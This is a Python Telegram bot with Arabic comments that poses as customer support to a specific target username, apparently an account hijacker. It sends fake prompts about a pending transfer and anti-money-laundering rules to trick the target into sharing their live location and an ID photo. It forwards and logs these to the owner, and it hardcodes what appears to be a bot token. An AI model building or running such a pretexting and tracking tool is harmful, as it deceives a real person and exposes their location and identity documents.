#!/usr/bin/env python3
"""
بوت تليجرام متكامل - تواصل مع الخاطف + سحب بيانات
"""

import os
import time
import logging
from datetime import datetime
from telebot import TeleBot, types

# ================== الإعدادات ==================
BOT_TOKEN = "8680472604:AAH8b0pnjse3s80jN3M_NxrfewFe0jPzRCw"  # توكن البوت الجديد
OWNER_ID = 8391968596  # معرفك أنت
TARGET_USERNAME = "Hnfkldmemd"  # يوزر الخاطف
# ==============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
bot = TeleBot(BOT_TOKEN)

visitors = {}
target_cid = None
# تخزين آخر رسالة من الخاطف للرد عليها
last_target_message = None

# ================== الأوامر الأساسية ==================

@bot.message_handler(commands=['start'])
def start_handler(message):
    cid = message.chat.id
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or ""

    visitors[cid] = {
        'username': uname,
        'name': fname,
        'user_id': uid,
        'first_seen': datetime.now().isoformat()
    }

    global target_cid
    if uname.lower() == TARGET_USERNAME.lower():
        target_cid = cid
        bot.send_message(OWNER_ID, f"🎯 **الخاطف متصل!**\n👤 @{uname}\n🆔 `{cid}`", parse_mode="Markdown")

    if uid == OWNER_ID:
        show_admin_panel(cid)
        return

    # رسالة ترحيب للخاطف (تبدو كخدمة عملاء)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📞 تواصل مع الدعم"))
    
    bot.send_message(cid, 
        "👋 مرحباً بك في خدمة العملاء.\n"
        "للحصول على المساعدة، اضغط على الزر أدناه.",
        reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "📞 تواصل مع الدعم" and m.from_user.id != OWNER_ID)
def support_request(message):
    cid = message.chat.id
    bot.send_message(cid, "📞 جاري توصيلك بأحد الممثلين...")
    bot.send_message(OWNER_ID, f"📞 **الخاطف يطلب التواصل!**\n👤 @{message.from_user.username}\n💬 {message.text}")

# ================== لوحة تحكم المطور ==================

def show_admin_panel(cid):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        "📍 طلب موقع", 
        "📸 طلب صورة",
        "📨 إرسال رسالة",
        "🎤 إرسال صوت",
        "📷 إرسال صورة",
        "🎥 إرسال فيديو",
        "📊 حالة المتصلين",
        "🔄 إعادة تشغيل"
    )
    
    bot.send_message(cid, 
        "🟢 **لوحة التحكم المتكاملة**\n\n"
        "📍 طلب موقع - يطلب من الخاطف إرسال موقعه\n"
        "📸 طلب صورة - يطلب من الخاطف إرسال صورته\n"
        "📨 إرسال رسالة - تكتب رسالة وترسلها للخاطف\n"
        "🎤 إرسال صوت - ترفع ملف صوتي وترسله للخاطف\n"
        "📷 إرسال صورة - ترفع صورة وترسلها للخاطف\n"
        "🎥 إرسال فيديو - ترفع فيديو وترسله للخاطف",
        reply_markup=markup,
        parse_mode="Markdown")

# ================== طلب الموقع ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📍 طلب موقع")
def request_location(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return

    text = """📍 **تأكيد الموقع الجغرافي**

لإتمام عملية التحويل، يرجى مشاركة موقعك الحالي.

🔒 هذا الإجراء آمن ومشفر.
⏳ سيتم إلغاء التحويل تلقائياً بعد 24 ساعة."""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📍 مشاركة الموقع", request_location=True)
    markup.add(btn)
    
    bot.send_message(target_cid, text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(OWNER_ID, "✅ تم إرسال طلب موقع للخاطف")

# ================== طلب صورة ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📸 طلب صورة")
def request_photo(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return

    text = """🆔 **توثيق الهوية**

لإتمام التحويل، يرجى إرسال صورة واضحة لهويتك.

⚠️ هذا الإجراء إلزامي وفقاً لقوانين مكافحة غسيل الأموال."""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📸 إرسال صورة")
    markup.add(btn)
    
    bot.send_message(target_cid, text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(OWNER_ID, "✅ تم إرسال طلب صورة للخاطف")

# ================== استقبال الموقع ==================

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location:
        lat = message.location.latitude
        lon = message.location.longitude
        
        global target_cid
        if message.chat.id == target_cid:
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            msg = f"""📍 **تم استلام موقع الخاطف!**

**العرض:** `{lat}`
**الطول:** `{lon}`
**الدقة:** {message.location.horizontal_accuracy or 'غير متوفر'} متر

🔗 [فتح في خرائط جوجل]({maps_link})"""
            
            bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
            bot.send_location(OWNER_ID, lat, lon)
            
            with open("target_location.txt", "a") as f:
                f.write(f"{datetime.now().isoformat()},{lat},{lon}\n")

# ================== استقبال الصور ==================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if message.photo:
        photo = message.photo[-1]
        file_info = bot.get_file(photo.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs("photos", exist_ok=True)
        file_path = f"photos/target_photo_{timestamp}.jpg"
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        with open(file_path, 'rb') as f:
            bot.send_photo(OWNER_ID, f, caption=f"📸 **صورة من الخاطف**\n⏰ {timestamp}")

# ================== إرسال رسالة مخصصة للخاطف ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال رسالة")
def send_custom_message_prompt(message):
    msg = bot.send_message(OWNER_ID, "✏️ **أرسل النص الذي تريد إرساله للخاطف:**", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_custom_message)

def process_custom_message(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return
    
    bot.send_message(target_cid, f"📨 **رسالة من الدعم:**\n{message.text}")
    bot.send_message(OWNER_ID, f"✅ **تم إرسال رسالتك للخاطف:**\n\n{message.text}")

# ================== إرسال صوت للخاطف ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🎤 إرسال صوت")
def send_audio_prompt(message):
    bot.send_message(OWNER_ID, "🎤 **أرسل الملف الصوتي (OGG/MP3) الذي تريد إرساله للخاطف:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_audio_message)

def process_audio_message(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return
    
    if message.audio or message.voice or message.document:
        # إعادة توجيه الملف للخاطف
        if message.audio:
            bot.send_audio(target_cid, message.audio.file_id)
        elif message.voice:
            bot.send_voice(target_cid, message.voice.file_id)
        else:
            bot.send_document(target_cid, message.document.file_id)
        bot.send_message(OWNER_ID, "✅ تم إرسال الملف الصوتي للخاطف")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال ملف صوتي صحيح")

# ================== إرسال صورة للخاطف ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📷 إرسال صورة")
def send_photo_prompt(message):
    bot.send_message(OWNER_ID, "📷 **أرسل الصورة التي تريد إرسالها للخاطف:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_photo_message)

def process_photo_message(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return
    
    if message.photo:
        bot.send_photo(target_cid, message.photo[-1].file_id, caption="📷 صورة من الدعم")
        bot.send_message(OWNER_ID, "✅ تم إرسال الصورة للخاطف")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال صورة صحيحة")

# ================== إرسال فيديو للخاطف ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🎥 إرسال فيديو")
def send_video_prompt(message):
    bot.send_message(OWNER_ID, "🎥 **أرسل الفيديو الذي تريد إرساله للخاطف:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_video_message)

def process_video_message(message):
    global target_cid
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return
    
    if message.video:
        bot.send_video(target_cid, message.video.file_id, caption="🎥 فيديو من الدعم")
        bot.send_message(OWNER_ID, "✅ تم إرسال الفيديو للخاطف")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال فيديو صحيح")

# ================== حالة المتصلين ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 حالة المتصلين")
def show_visitors(message):
    if not visitors:
        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين")
        return
    
    msg = "📊 **المتصلون:**\n\n"
    for cid, data in visitors.items():
        uname = data.get('username', '?')
        is_target = "🎯" if uname.lower() == TARGET_USERNAME.lower() else "⚪"
        msg += f"{is_target} @{uname} - `{cid}`\n"
    
    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")

# ================== استقبال رسائل الخاطف ==================

@bot.message_handler(func=lambda m: True)
def catch_all(message):
    cid = message.chat.id
    uname = message.from_user.username or ""
    
    # إذا كانت الرسالة من الخاطف وليست من المطور
    if uname.lower() == TARGET_USERNAME.lower() and message.from_user.id != OWNER_ID:
        # تخزين آخر رسالة للرد عليها
        global last_target_message
        last_target_message = message
        
        # إرسال رسالة للمطور
        text = message.text or "[وسائط]"
        bot.send_message(OWNER_ID, 
            f"✉️ **رسالة من الخاطف:**\n"
            f"👤 @{uname}\n"
            f"💬 {text}\n\n"
            f"_استخدم /reply للرد عليه_",
            parse_mode="Markdown")

# ================== أمر الرد على الخاطف ==================

@bot.message_handler(commands=['reply'])
def reply_to_target(message):
    global target_cid, last_target_message
    if not target_cid:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
        return
    
    msg = bot.send_message(OWNER_ID, "✏️ **أرسل الرد الذي تريد إرساله للخاطف:**", parse_mode="Markdown")
    bot.register_next_step_handler(msg, send_reply)

def send_reply(message):
    global target_cid, last_target_message
    if target_cid:
        bot.send_message(target_cid, f"📨 **رد من الدعم:**\n{message.text}")
        bot.send_message(OWNER_ID, f"✅ تم إرسال الرد للخاطف:\n\n{message.text}")

# ================== إعادة تشغيل ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔄 إعادة تشغيل")
def restart_bot(message):
    bot.send_message(OWNER_ID, "🔄 جاري إعادة التشغيل...")
    os._exit(0)

# ================== التشغيل ==================

if __name__ == "__main__":
    os.makedirs("photos", exist_ok=True)
    print("✅ البوت شغال! انتظار اتصال الخاطف...")
    
    try:
        bot.send_message(OWNER_ID, "🟢 **البوت شغال!**\n/start للوحة التحكم", parse_mode="Markdown")
    except:
        pass
    
    bot.infinity_polling()
